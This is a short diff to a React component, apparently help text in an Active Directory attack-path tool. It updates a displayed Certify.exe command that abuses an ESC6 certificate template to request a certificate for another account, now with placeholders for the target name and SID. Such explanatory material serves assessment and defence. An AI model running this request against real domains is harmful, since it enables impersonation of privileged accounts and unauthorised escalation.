@@ -27,7 +27,7 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <Typography component={'pre'}>
                 {
-                    '.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:forestrootda'
+                    '.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:<target UPN or SAMAccountName without $> /url:"tag:microsoft.com,2022-09-14:sid:<target SID>"'
                 }
             </Typography>
             <Typography variant='body2'>
